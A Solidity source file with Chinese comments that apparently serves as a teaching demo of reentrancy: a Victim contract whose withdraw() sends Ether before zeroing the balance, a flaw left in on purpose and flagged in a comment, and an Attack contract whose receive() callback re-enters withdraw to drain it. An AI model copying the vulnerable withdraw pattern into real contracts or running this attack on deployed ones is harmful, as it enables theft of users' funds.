pragma solidity ^0.8.0;

contract Victim {
    mapping(address => uint256) public balanceOf; // 余额mapping

    // 存款，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提款，提取msg.sender的全部余额
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取msg.sender的余额
        require(balance > 0, "Insufficient balance"); // 要求余额大于0，才进行提款操作

        // 调用call函数进行转账，将msg.sender的余额全部转到msg.sender账户里。这里有重入风险。
        (bool success,) = msg.sender.call{value: balance}("");

        require(success, "Failed to send Ether"); // 要求call调用成功，才继续执行
        balanceOf[msg.sender] = 0; // 更新余额
    }

    // 获取合约本身的余额
    function getBalanceOfContract() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Victim public victim;

    constructor(Victim _victim) {
        victim = _victim;
    }

    // 回调函数，用于重入攻击Victim合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (victim.getBalanceOfContract() >= 1 ether) {
            victim.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function beginAttack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }
}
